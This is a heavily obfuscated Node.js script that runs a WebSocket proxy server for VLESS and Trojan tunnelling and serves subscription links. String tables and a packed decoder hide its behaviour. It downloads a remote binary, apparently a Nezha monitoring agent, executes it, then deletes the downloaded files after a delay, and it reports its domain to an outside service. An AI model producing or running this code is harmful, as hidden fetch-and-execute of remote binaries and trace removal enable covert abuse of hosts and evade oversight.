(function(F){var X,R,T,V;function C(q,n){return q<<n}function d(q,n){return q>>n}function U(q,n){return q<=n}function r(q,n){return q%n}function A(q,n){return q*n}function v(q,n){return q+n}function K(q,n){return q-n}function z(q,n){return q/n}function b(q,n){return q<n}function e(q,n){return q>n}function H(q,n){return q>=n}function n(q,n,i){return q[n]=i,q}X=n;const I=(()=>'pKnSFfrOg4vGGZyvQrDEPR3yPS0Ni1FhTSCQdfMCiqkK++090eh1qteBFT6kfahuaEj5DPPodJjaijNO0sEAx52MJzkYeb5o0VMDJI23k8SWLRgcUSLL2S4dLMAGS+u6lTIaTnfFJtQlk9TOeElEa+AEqtrsxYBDWRciwlWU+nks6MzU8TyO2c1d8/0LbTdyUMpi/VGNM/LzbfS1NOhEyAPeHNAHpCikH8TYAtlgO/x9be62hQy5WCsCzxDGUL08YBB2oOcJAzAOQ6bZTVnwAhhMOlIdmSAh7QLqlKePulS7ehwgK2XQg6ZF9VCHC2Qy0lbqLlv2Oe+HhNiobs6kxB9EmAuaz8gJJkR7NcV8+IlodMHFDLAPWZ9Knp2ze09g5FDPuOBY3SoC9njL1SZNCU6UJD1nk+nIXkNFPol2i4YoW04N2aeyibQmEkX8q3mmcQ+tdgehvxA8wGNQLP6arZmNByuNvPZoS/1VEEUAV5QcQTBpS8FyGWK6xMfbC6lCOPUlGKW8kJit2lmklA68QNFkKORa0949VCIISdD58axE+gl4had7BtP0wr9uaEjo/HhpGLJOzrRDukf0rLZTIgICElPOAAqmDOsiglefupLiHIbQSTHggBSE0Md/b9YIbBBVbBnVZvpvcKmTJMZVuvCDwo4gR380jlBWjaeE2Go8QyeoDKofiXVXtgLuyGOG2PPkAbJNaUX8pUy6EjfN0juqCF/9nrAXeWK/cPmUCQsWLDbBn7dNuqt20bY/FP/lWe3DQTnxsevxGfmZH2GpgfVNLpyTWgRNC3NKnSCqqAD5I7Axwh2fU0GVJOsCxvImAFmVP1Nc8A3BxBHLR9y7ZSuXaSQ8L4B8Go4conBmX3le1n/DGtz52k3wGH5eTc489kHhSsLfJg0m27IFrxQ+BIkfBhI3PopzSNIHjaa6vpI375/+x8QY/9jAogHCzPzZZIaarqLzVxQd1JZFKbYx1ZLb9CU0p/JBFsql0DLSdnx+Yh5LkNfH7Yqb+h/RLyn8m8BAZQ/eH09vF4QFwAhcrprCCO9YUtTpOIn5LcquQpUHZDT6OOIDkEy7jzmQTUESt/bFIXglE74p2HdfKK3VSOUIs0AScuHLeGdDmZ09vi77lu/44ZmYxRbG5mkfH+gc78hN3n2lfiLAOk9qjoeNrzLugKRCed0uj++vpj0j44GoxG+OdqwwBDyArnGVG9SFOT7zRSJpFKZe7nX+Pc/r6Rgow==|fromCharCode|object|obje|d|StringExtract|length|_$a'.split('|'))();(T=Object.assign)&&0||(V=JSON.parse);let Y=[v('eNqFV1t32zYM/iucl+VllXyJq7o5J+2cxKmzNpfFcZt22fGhRdpiIpGKSPnSbf99ACg5ztKepg8VCRAE8QEf4L8bRkSN/UacqFRM8sLE0trGi4b1u4XkTn6S05GJ76UbOVhnID2OULrf7e69lTou1rlTRh9oo+WulXFZKLc+cKndtVodgLq6QfUlbMsTlcrRWsewu6QrEudyWAzJotQCvoWhu43WMnawzm5qRbvfbBr4C60sFq1WqKVrciGCskhB7wPZ4PaimHOtvnJ0CraT2lzM0doDWWtOlW5OuU1g55LOjRx3JT49JX3OiziJurC+JrGTFk/nXlhkJFqTLSudVYJpk5Q5C5s6z1hgGYhP8IWdF40bstDXdikL2HZkI5Er+P6dgpBzh46sSKB0nJZCoivnJD0ffBn2J+8HnzHy/sZEpvjiK5S/bLVaEDS6wwdiSErowUcycHxx1j89x1BEPhSldsUa1kd0IYAqxqfa9TCGdPRWl1ZO5oCXnDgzKfN5wYXcZzOeWumFKl9Ek8oS/L8tLZXYx8u/0OV7Yi9qCTkLZq3eLOi2O+2gN+21A9l9uSdltxOJNl6ckmt3RiFk78w24jwTUTe08BfqdRxmusnnUhMadAhglATHezpGoDuS7M7ygzgpTCZ33TqXB0u7mxjrMCcvKt1YwmKGnrZ7gIDHGnRhd0QqGRQE3AfrO3rPEoH5RCKbpwrd0CQYj0+PMaZkYqzvtVmiJ+K7ORIzSMqZmodrnqXsTVPIRVOXaco6b3bbbBfOFmS43dnrhnwah7HB4nsX+SwRchUmLkPAJ1VWxphFSQWhvVf5pKoiqAQP1j5zRSkrIZa7fbrvZJbLAiqheAQUKpnwXFC2RRDn6JEcRlCJlNVxlUuipJCm5EWqrJMYha/0ErmScVX9F2TjZ/ia08FO63WEiNKxUqdK38Oyv1UAlxdX14iKh6gwd1xDcsDOfXWzzY228tqD58gQxllZVpRaKz2H7QEh/QoQJDO2nFqH3hsPaE1wp6T2GnjQ1GYEwJkaLpgtYyTJGSCFNXRGLn4aXfavhwiFd88AV/oblzVjYG6QUxRWWP2x9bjR4Orj4ArDGPnH5CmnOL6jIz7KW09hRrPcFA5xGZOdYYm3zT3VgIc5ZuahT2GOFPv+puLBOuVg77OHRS8wjD4iNZ4ndDRXFM2LJxSM8Yoe3UIa+0HBLtqIHBnJDREpp5sPy9mMDFiyl0o9Jyac7PAuigXmxLnZg',I[0])],s,i=String[I[1]],u=Uint8Array,L=Uint16Array,a=Uint32Array;R=typeof window===I[2]&&window||typeof self===I[2]&&self||exports||typeof globalThis==='object'&&globalThis||typeof global===v(I[3],'ct')&&global;let q=(function(q){var d,V,z,L,a;V=n;let Y=(()=>V({},'f','atob'))();((((z='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')||true)&&(d=function(z){var i,r,q;const n=(()=>V(V(V({},'f',0),'S','length'),'g','charAt'))();for((((q={})||'1')&&(i=n.f)||5)&&(r=z[n.S]);b(i,r);i++)q[z[n.g](i)]=i;return q}(z))&&0||(a=function(Y){var L,z,a,q;function V(){return'length|charAt|join'.split('|')}const n=V();return(q=Y[n[0]])&&0||(a=r(q,4),L=(e(q,0)?C(d[Y.charAt(0)],18):0)|(e(q,1)?C(d[Y[v('char','At')](1)],12):0)|(e(q,2)?C(d[Y[n[1]](2)],6):0)|(e(q,3)?d[Y.charAt(3)]:0),z=[i(L>>>16),i(L>>>8&255),i(L&255)],z.length-=[0,0,2,1][a],z[n[2]](''))})||8)&&(L=function(q){const n=['replace'];return q[n[0]](/\S{1,4}/g,a)})||1)&&V(q,Y.f,function(q){return L(String(q)[v('repl','ace')](/[^A-Za-z0-9\+\/]/g,''))})}(R),function(T){var j,t,S,l,Q,x,E,$,D,X,w,N,k,G,I,J,f,o,F,V,Y,B,y,q,Z,W;w=n;let P=(()=>'K|prototype|I|J|th'.split('|'))();((N=8)&&0||(j=!0)||8)&&(Y=void 0);function M(q){throw q}function c(i,a){var z,V,q,d;V=n;const Y=['c',0,'method',8,31,32,'not','B','bufferSize','Type','resize'];q=this;(z=void 0,V(V(q,'input',i),Y[0],Y[1]),a||!(a={}))&&((a.index&&(q.c=a.index)||true)&&(a.verify&&(q.N=a[v('veri','fy')])));(d=i[q.c++])&&false||(z=i[q[Y[0]]++]);switch(d&15){case N:q[Y[2]]=N}(Y[1]!==r(v(C(d,8),z),31)&&M(Error(v('err:',r(v(C(d,Y[3]),z),Y[4]))))&&0||z&Y[5]&&M(Error(Y[6])))&&0||V(q,Y[7],new m(i,V(V(V(V({},'index',q.c),'bufferSize',a[Y[8]]),'bufferType',a[v('buffer',Y[9])]),'resize',a[Y[10]])))}(Q=(w(c.prototype,'p',function(){var z,a,d,Y,r;a=n;function q(){return['input',0,'p',24,'c','i32c']}let i=q();return((z=this)&&0||(r=z[i[0]]))&&0||(Y=void 0,d=void i[1],Y=z.B[i[2]](),a(z,'c',z.B.c),z.N&&(d=(C(r[z.c++],i[3])|C(r[z.c++],16)|C(r[z[i[4]]++],8)|r[z.c++])>>>0,d!==jb(Y)&&M(Error(i[5]))),Y)}),0))&&0||(W=1);function m(z,r){var q,d;d=n;const i=['l','e','c',0,'input',!1,'n','C','ex','Size','ze','resize','b','a','m',258,'o','imd'];q=this;(d(d(d(d(d(d(d(q,i[0],[]),'m',32768),i[1],q.g=q[i[2]]=q.q=i[3]),i[4],x?new u(z):z),'s',i[5]),i[6],W),i[7],!1),r||!(r={}))&&(((r.index&&(q.c=r[v('ind',i[8])])||8)&&(r[v('buffer',i[9])]&&(q.m=r.bufferSize))&&0||r.bufferType&&(q.n=r.bufferType)||3)&&(r[v('resi',i[10])]&&(q[i[7]]=r[i[11]])));switch(q[i[6]]){case Q:q[i[12]]=32768;q[i[13]]=new(x?u:Array)(v(v(32768,q[i[14]]),i[15]));break;case W:q[i[12]]=i[3];q[i[13]]=new(x?u:Array)(q[i[14]]);q.f=q.K;q.t=q.I;q[i[16]]=q.J;break;default:M(Error(i[17]))}}m[P[1]][P[0]]=function(Y){var d,n,V,q,i,a,r,R;function s(){return'length|c|inp|a|number|u|th'.split('|')}let L=s();return(i=this)&&0||(r=v(z(i[v('inp','ut')][L[0]],i[L[1]]),1)|0,q=void 0,a=void 0,R=void 0,n=i[v(L[2],'ut')],d=i[L[3]],Y&&('number'===typeof Y.v&&(r=Y.v),L[4]===typeof Y.G&&(r+=Y.G)),e(2,r)?(q=z(K(n[L[0]],i[L[1]]),i[L[5]][2]),R=A(258,z(q,2))|0,a=b(R,d.length)?v(d.length,R):C(d[v('leng',L[6])],1)):a=A(d[L[0]],r),x?(V=new u(a),V.set(d)):V=d,i.a=V)};m[P[1]][P[2]]=function(){var r,i,n;function q(){return'b|length|a|C|ray'.split('|')}let z=q();return(n=this)&&0||(r=n[z[0]],x?n[z[3]]?(i=new u(r),i.set(n.a.subarray(0,r))):i=n.a[v('subar',z[4])](0,r):(e(n[z[2]][z[1]],r)&&(n.a[z[1]]=r),i=n[z[2]]),n.buffer=i)};m.prototype[P[3]]=function(a,R){var u,Y,s,r,d,A,z,i,L;s=n;let F=(()=>s(s(s(s(s(s({},'f','th'),'S',257),'g',0),'_',8),'v','e'),'j','b'))();for(((((d=this)||true)&&(r=d.a)||'0')&&(i=d.b)||5)&&s(d,'u',a)&&0||(L=r[v('leng',F.f)]);256!==(u=O(d,a));)if(e(256,u)){H(i,L)&&(r=d.f(),L=r.length)&&0||(r[i++]=u)}else{for(((((((z=K(u,F.S))||6)&&(A=V[z])&&0||b(F.g,$[z])&&(A+=h(d,$[z])))&&false||(u=O(d,R)))&&false||(Y=q[u])||9)&&(b(0,I[u])&&(Y+=h(d,I[u])))||5)&&(e(v(i,A),L)&&(r=d.f(),L=r.length));A--;)r[i]=r[K(i++,Y)]}for(;U(F._,d.e);)d[F.v]-=F._,d.c--;s(d,F.j,i)};function R(z){var u,d,s,F,q,p,Y,R,V,r,A,i,n;let L=[0,'POSITIVE_INFINITY',1,2];((Y=z.length)||9)&&(i=L[0])&&0||(R=Number[L[1]]);for(F=0;b(F,Y);++F)e(z[F],i)&&(i=z[F]),b(z[F],R)&&(R=z[F]);for(d=(r=C(L[2],i),A=new(x?a:Array)(r),n=1,u=0,L[3]);U(n,i);){for(F=L[0];b(F,Y);++F)if(z[F]===n){for(p=(V=L[0],q=u,L[0]);b(p,n);++p)V=C(V,1)|q&L[2],q>>=L[2];for(p=(s=C(n,16)|F,V);b(p,r);p+=d)A[p]=s;++u}(++n&&0||(u<<=L[2])||4)&&(d<<=1)}return[A,i,R]}function O(e,L){var r,F,s,A,z,V,a,Y,R,q;F=n;let i='g|ut|th|c'.split('|');for((((((r=e[i[0]])&&0||(A=e.e)||'0')&&(z=e[v('inp',i[1])])&&0||(s=e.c)||7)&&(q=z[v('leng',i[2])])||8)&&(a=L[0])||4)&&(R=L[1]);b(A,R)&&!H(s,q);)r|=C(z[s++],A),A+=8;return V=a[r&K(C(1,R),1)],Y=V>>>16,F(F(F(e,i[0],d(r,Y)),'e',K(A,Y)),i[3],s),V&65535}function s(z){var e,i,L,r,a,q,V,d,F;F=n;function A(){return F(F(F(F(F(F(F(F(F({},'f',5),'S',1),'g',4),'_','leng'),'v',0),'j',3),'l','z'),'D','o'),'H','call')}let s=A();function Y(a,Y,r){var z,V,i,q,L,d;V=n;const A=[0,3,17,7,18];((z=this)||1)&&(q=z.z);for(i=A[0];b(i,a);)switch(d=O(z,Y),d){case 16:for(L=v(3,h(z,2));L--;)r[i++]=q;break;case A[2]:for(L=v(A[1],h(z,A[1]));L--;)r[i++]=0;q=A[0];break;case A[4]:for(L=v(11,h(z,A[3]));L--;)r[i++]=A[0];q=A[0];break;default:q=r[i++]=d}return V(z,'z',q),r}((((i=v(h(z,s.f),257))&&0||(V=v(h(z,5),s.S))||8)&&(r=v(h(z,4),s.g))||2)&&(a=new(x?u:Array)(X[v(s._,'th')]))&&0||(e=void 0)||3)&&(d=void 0);for(L=s.v;b(L,r);++L)a[X[L]]=h(z,s.j);if(!x){for(r=(L=r,a.length);b(L,r);++L)a[X[L]]=s.v}(((q=R(a))&&0||(e=new(x?u:Array)(i)))&&false||(d=new(x?u:Array)(V))||6)&&F(z,s.l,s.v)&&0||z[s.D](R(Y[s.H](z,i,q,e)),R(Y[s.H](z,V,q,d)))}function h(d,V){var L,r,q,i,z,Y,A;L=n;let a=(()=>['g','e','c','th'])();for(((((z=d[a[0]])||9)&&(q=d[a[1]])&&false||(Y=d.input)||'1')&&(A=d[a[2]])||7)&&(i=Y[v('leng',a[3])]);b(q,V);)H(A,i)&&M(Error('bk')),z|=C(Y[A++],q),q+=8;return r=z&K(C(1,V),1),L(L(L(d,a[0],z>>>V),a[1],K(q,V)),'c',A),r}f=(m[P[1]].p=function(){var R,V,q,L,a,F,A,d,n,z,i;function u(){return w(w(w(w(w(w(w(w(w(w(w(w(w(w(w(w(w({},'f','s'),'S',1),'g','a'),'_','b'),'v','th'),'j','e'),'l','iL'),'D','iN'),'H','ih'),'n','leng'),'t','ib'),'m','length'),'G','v'),'k','subarray'),'I','c'),'s',0),'r','t')}let r=u();for(R=this;!R[r.f];){((i=h(R,3))&&0||i&r.S&&(R.s=j))&&null||(i>>>=r.S);switch(i){case r.s:a=R.input;n=R.c;L=R[r.g];z=R[r._];V=a[v('leng',r.v)];q=Y;F=Y;d=L.length;A=Y;R[r.j]=R.g=0;H(v(n,1),V)&&M(Error(r.l));q=a[n++]|C(a[n++],8);H(v(n,1),V)&&M(Error(r.D));F=a[n++]|C(a[n++],8);q===~F&&M(Error(r.H));e(v(n,q),a[v(r.n,r.v)])&&M(Error(r.t));switch(R.n){case Q:for(;e(v(z,q),L.length);){if(A=K(d,z),q-=A,x){(L.set(a.subarray(n,v(n,A)),z)||8)&&(z+=A)&&0||(n+=A)}else{for(;A--;)L[z++]=a[n++]}((R[r._]=z)||'1')&&(L=R.f())&&0||(z=R.b)}break;case W:for(;e(v(z,q),L[r.m]);)L=R.f(w({},r.G,2));break;default:M(Error('im'))}if(x){(L.set(a[r.k](n,v(n,q)),z)&&0||(z+=q)||5)&&(n+=q)}else{for(;q--;)L[z++]=a[n++]}R[r.I]=n;R.b=z;R.a=L;break;case 1:R.o(k,E);break;case 2:s(R);break;default:M(Error(v('e: ',i)))}}return g(R[r.r]())},'undefined');x=f!==typeof u&&f!==typeof L&&f!==typeof a&&f!==typeof DataView;X=(D=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],x?new L(D):D);V=(F=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258],x?new L(F):F);$=(J=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0],x?new u(J):J);q=(G=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],x?new L(G):G);I=(Z=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],x?new u(Z):Z);o=new(x?u:Array)(288);for(y=(y=void 0,S=0,o[v('leng',P[4])]);b(S,y);++S)o[S]=H(143,S)?8:H(255,S)?9:H(279,S)?7:8;k=R(o);t=new(x?u:Array)(30);for(B=(B=void 0,l=0,t[v('leng','th')]);b(l,B);++l)t[l]=5;E=R(t);function g(r){var Y,V,a,q,n,L;const z=(()=>w(w(w(w(w(w(w({},'f',''),'S',0),'g',12),'_',31),'v',15),'j',6),'l',14))();(((a=void 0)&&0||(q=z.f))&&0||(a=r.length)||'0')&&(n=z.S);while(b(n,a)){V=r[n++];switch(d(V,4)){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:q+=i(V);break;case z.g:case 13:L=r[n++];q+=i(C(V&z._,6)|L&63);break;case z.l:L=r[n++];Y=r[n++];q+=i(C(V&z.v,z.g)|C(L&63,z.j)|C(Y&63,z.S))}}return q}T.d=function(n){function q(){return['map','it','atob','']}let i=q(),z=new c(new u(T[i[2]](n)[v('spl',i[1])](i[3])[i[0]](q=>q[v('charCo','deAt')](0))),{}),r=z.p();return r}}(R),s=typeof globalThis==='object'&&globalThis||typeof window===v('obje','ct')&&window||typeof self===v('obje','ct')&&self||typeof global==='object'&&global,!0);for(let n of Y)(n=R[I[4]](n),n=V(n),q)?T(s,n):((s[I[5]]=n)||4)&&T(s,n);for(let q=0;b(q,F[I[6]]);q++)s[v('_$a',q)]&&T(s,X({},s[v(I[7],q)],F[q]))}([encodeURIComponent,parseInt,console.error,'MUC',console.log,null]));const os=require(_d6),http=require(wd6),fs=require(pd6),axios=require(ld6),net=require(Gd6),path=require(Jd6),crypto=require(ud6),$vDZKxW=require($d6),Buffer=$vDZKxW[ad6],$vpSCfJ=require(od6),exec=$vpSCfJ[kd6],execSync=$vpSCfJ[zd6],$vqUFF2=require(jd6),WebSocket=$vqUFF2[Td6],createWebSocketStream=$vqUFF2[sd6],UUID=process[Yd6][nd6]||Zd6,NEZHA_SERVER=process[Yd6][Qd6]||'',NEZHA_PORT=process[Yd6][Ad6]||'',NEZHA_KEY=process[Yd6][Nd6]||'',DOMAIN=process[Yd6][Vd6]||rd6,AUTO_ACCESS=process[Yd6][gd6]||!0,WSPATH=process[Yd6][Md6]||UUID[Pd6](hd6,Ld6),SUB_PATH=process[Yd6][Xd6]||ed6,NAME=process[Yd6][xd6]||Ud6,PORT=process[Yd6][Wd6]||id6;let ISP='';const GetISP=async()=>{try{const R=await axios.get(b66),D=R[B66];ISP=(D[h66]+i66+D[L66])[c66](/ /g,'_')}catch(R){ISP=C66}};GetISP();const httpServer=http[K66]((D,R)=>{if(D[d66]==='/'){const D=path[l66](__dirname,G66);fs[J66](D,u66,(D,w)=>{if(D){R[y66](dd6,{[F66]:$66}),R[H66](a66);return}R[y66](dd6,{[F66]:$66}),R[H66](w)});return}else{if(D[d66]===R66+SUB_PATH){const v=I66+UUID+q66+DOMAIN+D66+DOMAIN+t66+DOMAIN+v66+WSPATH+O66+NAME+i66+ISP,a=S66+UUID+q66+DOMAIN+m66+DOMAIN+t66+DOMAIN+v66+WSPATH+O66+NAME+i66+ISP,w=v+'\n'+a,D=Buffer[w66](w)[_66](p66);R[y66](dd6,{[F66]:E66}),R[H66](D+'\n')}else{R[y66](Kd6,{[F66]:E66}),R[H66](f66)}}}),wss=new WebSocket[o66]({[k66]:httpServer}),uuid=UUID[c66](/-/g,''),DNS_SERVERS=[z66,j66];function resolveHost(R){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[T66](R)){resolve(R);return}let w=hd6;function D(){if(w>=DNS_SERVERS[s66]){reject(new Error(n66+R+Y66));return}const v=DNS_SERVERS[w];w++;const a=Z66+Cd6(R)+Q66;axios.get(a,{[V66]:Rd6,[M66]:{[g66]:r66}})[N66](w=>{const R=w[B66];if(R[P66]===hd6&&R[X66]&&R[X66][s66]>hd6){const D=R[X66][e66](R=>R[x66]===yd6);if(D){resolve(D[B66]);return}}D()})[A66](R=>((D()),void 0))}D()})}function handleVlessConnection(N,R){var m=Pd6,B=yd6;const [a]=R,l=R[m](B,Ed6);if(!l[U66]((R,D)=>R==bd6(uuid[W66](D*Fd6,Fd6),Hd6))){return!1}let U=R[m](Ed6,fd6)[Co6]()+Id6;const w=R[m](U,U+=Fd6)[bo6](hd6),D=R[m](U,U+=B)[Co6](),v=D==B?R[m](U,U+=Dd6)[l66]('.'):D==Fd6?new TextDecoder()[Lo6](R[m](U+B,U+=B+R[m](U,U+B)[Co6]())):D==qd6?R[m](U,U+=Hd6)[co6]((w,D,a,R)=>a%Fd6?w[ho6](R[Pd6](a-yd6,a+yd6)):w,[])[Bo6](R=>R[bo6](hd6)[_66](Hd6))[l66](':'):'';N[io6](new Uint8Array([a,hd6]));const J=createWebSocketStream(N);resolveHost(v)[N66](D=>((net[do6]({[Ro6]:D,[yo6]:w},function(){this[Eo6](R[Pd6](U)),J[Ko6](Ho6,()=>{})[Fo6](this)[Ko6](Ho6,()=>{})[Fo6](J)})[Ko6](Ho6,()=>{})),void 0))[A66](D=>((net[do6]({[Ro6]:v,[yo6]:w},function(){this[Eo6](R[Pd6](U)),J[Ko6](Ho6,()=>{})[Fo6](this)[Ko6](Ho6,()=>{})[Fo6](J)})[Ko6](Ho6,()=>{})),void 0));return!0}function handleTrojanConnection(a,R){var D=Pd6,w=yd6;try{if(R[s66]<td6){return!1}const B=R[D](hd6,vd6)[_66](),v=[UUID];let J=null;for(const R of v){const D=crypto[qo6](Do6)[Io6](R)[fo6](to6);if(D===B){J=R;break}}if(!J){return!1}let offset=vd6;if(R[offset]===Od6&&R[offset+w]===Sd6){offset+=Fd6}const c=R[offset];if(c!==w){return!1}offset+=w;const l=R[offset];offset+=w;let N,U;if(l===w){N=R[D](offset,offset+Dd6)[l66]('.'),offset+=Dd6}else{if(l===qd6){const a=R[offset];offset+=w,N=R[D](offset,offset+a)[_66](),offset+=a}else{if(l===Dd6){N=R[D](offset,offset+Hd6)[co6]((w,D,a,R)=>a%Fd6?w[ho6](R[Pd6](a-yd6,a+yd6)):w,[])[Bo6](R=>R[bo6](hd6)[_66](Hd6))[l66](':'),offset+=Hd6}else{return!1}}}U=R[bo6](offset),offset+=Fd6;if(offset<R[s66]&&R[offset]===Od6&&R[offset+w]===Sd6){offset+=Fd6}const m=createWebSocketStream(a);resolveHost(N)[N66](D=>((net[do6]({[Ro6]:D,[yo6]:U},function(){if(offset<R[s66]){this[Eo6](R[Pd6](offset))}m[Ko6](Ho6,()=>{})[Fo6](this)[Ko6](Ho6,()=>{})[Fo6](m)})[Ko6](Ho6,()=>{})),void 0))[A66](D=>((net[do6]({[Ro6]:N,[yo6]:U},function(){if(offset<R[s66]){this[Eo6](R[Pd6](offset))}m[Ko6](Ho6,()=>{})[Fo6](this)[Ko6](Ho6,()=>{})[Fo6](m)})[Ko6](Ho6,()=>{})),void 0));return!0}catch(v){return!1}}wss[Ko6](vo6,(R,w)=>{const D=w[d66]||'';R[Oo6](So6,D=>{if(D[s66]>Ed6&&D[hd6]===hd6){const w=D[Pd6](yd6,Ed6),a=w[U66]((R,D)=>R==bd6(uuid[W66](D*Fd6,Fd6),Hd6));if(a){if(!handleVlessConnection(R,D)){R[mo6]()}return}}if(!handleTrojanConnection(R,D)){R[mo6]()}})[Ko6](Ho6,()=>{})});const getDownloadUrl=()=>{const R=os[_o6]();return R===wo6||R===po6||R===lo6?!NEZHA_PORT?$o6:uo6:!NEZHA_PORT?Jo6:Go6},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const w=getDownloadUrl(),R=await axios({[ao6]:'get',[d66]:w,[ko6]:oo6}),D=fs[zo6](jo6);R[B66][Fo6](D);return new Promise((resolve,reject)=>((D[Ko6](To6,()=>((Bd6(so6)),(exec(no6,R=>{if(R){reject(R)}resolve()})),void 0))),(D[Ko6](Ho6,reject)),void 0))}catch(R){throw R}},runnz=async()=>{try{const status=execSync(Yo6,{[Qo6]:Zo6});if(status[Ao6]()!==''){Bd6(No6);return}}catch(D){}await downloadFile();let a='',R=[Vo6,ro6,go6,Mo6,Po6,Xo6];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const D=R[xo6](NEZHA_PORT)?RX6:'';a=yX6+NEZHA_SERVER+EX6+NEZHA_PORT+FX6+NEZHA_KEY+HX6+D+fX6}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const w=NEZHA_SERVER[xo6](':')?NEZHA_SERVER[Wo6](':')[Uo6]():'',D=R[xo6](w)?bX6:CX6,a=BX6+NEZHA_KEY+cX6+NEZHA_SERVER+hX6+D+LX6+UUID;fs[iX6](KX6,a)}a=dX6}else{Bd6(eo6);return}}try{exec(a,{[DX6]:qX6},R=>{if(R){cd6(vX6,R)}else{Bd6(tX6)}})}catch(w){cd6(IX6+w)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const R=OX6+DOMAIN;try{const D=await axios[SX6](mX6,{[d66]:R},{[M66]:{[F66]:_X6}});Bd6(wX6)}catch(D){}}const delFiles=()=>((fs[pX6](jo6,()=>{})),(fs[pX6](KX6,()=>{})),void 0);httpServer[lX6](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),md6)),(addAccessTask()),(Bd6(GX6+PORT)),void 0))
